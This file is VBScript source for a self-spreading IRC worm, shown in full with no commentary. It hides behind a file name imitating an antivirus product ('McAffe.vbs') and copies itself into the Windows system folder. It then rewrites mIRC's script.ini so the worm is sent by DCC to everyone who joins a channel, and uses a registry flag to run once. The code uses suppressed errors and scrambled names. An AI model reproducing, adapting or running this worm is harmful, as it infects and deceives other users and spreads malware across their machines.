On Error Resume Next
Set ftekrirkmzt = CreateObject("WScript.Shell")
set wuozupwbtsm=createobject("scripting.filesystemobject")
wuozupwbtsm.copyfile wscript.scriptfullname,wuozupwbtsm.GetSpecialFolder(1)& "\McAffe.vbs"
if ftekrirkmzt.regread ("HKCU\software\McAffe\mirqued") <> "1" then
spywitfigmn()
end if
Function spywitfigmn
On Error Resume Next
if wuozupwbtsm.fileexists("c:\mirc\mirc.ini") then MircLoc="c:\mirc"
if wuozupwbtsm.fileexists("c:\mirc32\mirc.ini") then MircLoc="c:\mirc"
Programfilesdir=ftekrirkmzt.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if wuozupwbtsm.fileexists(Programfilesdir & "\mirc.ini") then MircLoc=Programfilesdir & "\mirc"
set vfglqncktdn = wuozupwbtsm.CreateTextFile(MircLoc & "\script.ini", True)
vfglqncktdn.writeline "n0=on 1:JOIN:#:{"
vfglqncktdn.writeline "n1=  /if ( $nick == $me ) { halt }"
vfglqncktdn.writeline "n2=  /.dcc send $nick C:\WINDOWS\SYSTEM\McAffe.vbs"
vfglqncktdn.writeline "n3=}"
vfglqncktdn.close
ftekrirkmzt.regwrite "HKCU\software\McAffe\Mirqued", "1"
end function
'Lee